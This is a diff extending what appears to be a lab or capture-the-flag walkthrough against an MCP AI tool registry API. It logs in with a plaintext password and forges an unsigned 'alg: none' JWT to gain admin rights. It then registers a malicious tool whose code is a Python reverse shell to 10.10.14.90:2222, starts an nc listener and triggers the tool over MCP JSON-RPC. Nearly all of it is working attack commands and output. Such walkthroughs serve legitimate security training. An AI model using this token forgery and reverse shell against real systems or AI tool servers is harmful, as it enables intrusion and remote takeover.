@@ -236,7 +236,7 @@ cat .mcp/config.json
 ```
 
 ```bash
-curl -s http://10.129.7.108:30080/api/v1/version | python3 -m json.tool
+curl -s http://10.129.7.108:30080/api/v1/version | jq
 ```
 
 ```json
@@ -258,5 +258,456 @@ curl -s http://10.129.7.108:30080/api/v1/version | python3 -m json.tool
         "GET  /api/v1/tools",
         "POST /api/v1/tools               [admin]"
     ]
+}
+```
+
+```bash
+curl -s http://10.129.7.147:30080/docs
+```
+
+```html
+    <!DOCTYPE html>
+    <html>
+    <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
+    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
+    <title>MCP AI Tool Registry — Task Force Nightfall - Swagger UI</title>
+    </head>
+    <body>
+    <div id="swagger-ui">
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
+    <!-- `SwaggerUIBundle` is now available on the page -->
+    <script>
+    const ui = SwaggerUIBundle({
+        url: '/openapi.json',
+    "dom_id": "#swagger-ui",
+"layout": "BaseLayout",
+"deepLinking": true,
+"showExtensions": true,
+"showCommonExtensions": true,
+oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
+    presets: [
+        SwaggerUIBundle.presets.apis,
+        SwaggerUIBundle.SwaggerUIStandalonePreset
+        ],
+    })
+    </script>
+    </body>
+    </html>
+```
+
+```bash
+curl -s http://10.129.7.147:30080/openapi.json | jq
+```
+
+```json
+{
+  "openapi": "3.1.0",
+  "info": {
+    "title": "MCP AI Tool Registry — Task Force Nightfall",
+    "version": "0.1.0"
+  },
+  "paths": {
+    "/api/v1/version": {
+      "get": {
+        "summary": "Version",
+        "operationId": "version_api_v1_version_get",
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "additionalProperties": true,
+                  "type": "object",
+                  "title": "Response Version Api V1 Version Get"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/auth": {
+      "post": {
+        "summary": "Authenticate",
+        "operationId": "authenticate_api_v1_auth_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/AuthRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "additionalProperties": {
+                    "type": "string"
+                  },
+                  "type": "object",
+                  "title": "Response Authenticate Api V1 Auth Post"
+                }
+              }
+            }
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/tools": {
+      "get": {
+        "summary": "List Tools",
+        "operationId": "list_tools_api_v1_tools_get",
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "items": {},
+                  "type": "array",
+                  "title": "Response List Tools Api V1 Tools Get"
+                }
+              }
+            }
+          }
+        }
+      },
+      "post": {
+        "summary": "Register Tool",
+        "operationId": "register_tool_api_v1_tools_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/ToolRegisterRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "additionalProperties": {
+                    "type": "string"
+                  },
+                  "type": "object",
+                  "title": "Response Register Tool Api V1 Tools Post"
+                }
+              }
+            }
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "HTTPBearer": []
+          }
+        ]
+      }
+    },
+    "/mcp": {
+      "post": {
+        "summary": "Mcp Endpoint",
+        "operationId": "mcp_endpoint_mcp_post",
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {}
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "HTTPBearer": []
+          }
+        ]
+      }
+    }
+  },
+  "components": {
+    "schemas": {
+      "AuthRequest": {
+        "properties": {
+          "username": {
+            "type": "string",
+            "title": "Username"
+          },
+          "password": {
+            "type": "string",
+            "title": "Password"
+          }
+        },
+        "type": "object",
+        "required": [
+          "username",
+          "password"
+        ],
+        "title": "AuthRequest"
+      },
+      "HTTPValidationError": {
+        "properties": {
+          "detail": {
+            "items": {
+              "$ref": "#/components/schemas/ValidationError"
+            },
+            "type": "array",
+            "title": "Detail"
+          }
+        },
+        "type": "object",
+        "title": "HTTPValidationError"
+      },
+      "ToolRegisterRequest": {
+        "properties": {
+          "name": {
+            "type": "string",
+            "title": "Name"
+          },
+          "description": {
+            "type": "string",
+            "title": "Description"
+          },
+          "inputSchema": {
+            "anyOf": [
+              {
+                "additionalProperties": true,
+                "type": "object"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Inputschema"
+          },
+          "code": {
+            "type": "string",
+            "title": "Code"
+          }
+        },
+        "type": "object",
+        "required": [
+          "name",
+          "description",
+          "code"
+        ],
+        "title": "ToolRegisterRequest"
+      },
+      "ValidationError": {
+        "properties": {
+          "loc": {
+            "items": {
+              "anyOf": [
+                {
+                  "type": "string"
+                },
+                {
+                  "type": "integer"
+                }
+              ]
+            },
+            "type": "array",
+            "title": "Location"
+          },
+          "msg": {
+            "type": "string",
+            "title": "Message"
+          },
+          "type": {
+            "type": "string",
+            "title": "Error Type"
+          },
+          "input": {
+            "title": "Input"
+          },
+          "ctx": {
+            "type": "object",
+            "title": "Context"
+          }
+        },
+        "type": "object",
+        "required": [
+          "loc",
+          "msg",
+          "type"
+        ],
+        "title": "ValidationError"
+      }
+    },
+    "securitySchemes": {
+      "HTTPBearer": {
+        "type": "http",
+        "scheme": "bearer"
+      }
+    }
+  }
+}
+```
+
+```bash
+curl -s -X POST http://10.129.7.147:30080/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | jq
+```
+
+```json
+{
+    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
+    "token_type": "bearer"
+}
+```
+
+```bash
+curl -s -X POST http://10.129.7.147:30080/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | jq -r .access_token | cut -d '.' -f 2 | base64 -d | jq
+```
+
+```json
+{
+  "sub": "langflow-bot",
+  "role": "user"
+}
+```
+
+```bash
+curl -s -X POST http://10.129.7.147:30080/api/v1/tools -H 'Content-Type: application/json' -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps' | jq
+```
+
+```json
+{
+  "detail": "Admin role required"
+}
+```
+
+```bash
+curl -s -X POST http://10.129.7.147:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.' -d '{}' | jq
+```
+
+```json
+{
+  "detail": [
+    {
+      "type": "missing",
+      "loc": [
+        "body",
+        "name"
+      ],
+      "msg": "Field required",
+      "input": {}
+    },
+    {
+      "type": "missing",
+      "loc": [
+        "body",
+        "description"
+      ],
+      "msg": "Field required",
+      "input": {}
+    },
+    {
+      "type": "missing",
+      "loc": [
+        "body",
+        "code"
+      ],
+      "msg": "Field required",
+      "input": {}
+    }
+  ]
+}
+```
+
+```bash
+curl -s -X POST http://10.129.7.147:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.' -d '{"name":"melvin","description":"melvin","inputSchema":{},"code":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.90\",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"}' | jq
+```
+
+```json
+{
+  "status": "registered",
+  "name": "melvin"
+}
+```
+
+```bash
+curl -s http://10.129.7.147:30080/api/v1/tools | jq
+```
+
+```json
+[
+  {
+    "name": "ping_host",
+    "description": "Ping a target host 3 times and return ICMP output."
+  },
+  {
+    "name": "get_metrics_summary",
+    "description": "Return a summary of system memory and load average from /proc."
+  },
+  {
+    "name": "list_running_tasks",
+    "description": "List the top 20 running processes sorted by CPU usage."
+  },
+  {
+    "name": "melvin",
+    "description": "melvin"
+  }
+]
+```
+
+[MCP JSON-RPC 2.0](https://modelcontextprotocol.io/specification/2025-03-26/basic)
+
+[Calling Tools](https://modelcontextprotocol.io/specification/2025-11-25/server/tools#calling-tools)
+
+```bash
+nc -lvnp 2222
+```
+
+```bash
+curl -s -X POST http://10.129.7.147:30080/mcp -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.' -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"melvin","arguments":{}}}' | jq
+```
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 1,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": ""
+      }
+    ],
+    "isError": true
+  }
 }
 ```
